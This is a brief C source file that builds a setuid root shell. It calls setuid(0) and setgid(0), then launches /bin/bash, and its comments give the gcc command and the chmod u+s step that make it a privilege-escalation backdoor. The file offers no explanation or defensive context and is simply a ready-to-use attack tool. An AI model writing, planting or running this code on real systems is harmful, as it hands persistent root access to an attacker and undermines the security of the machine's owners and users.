// To compile run: gcc shell.c -o shell
// Set suid bit if owner is changed: chmod u+s shell

#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
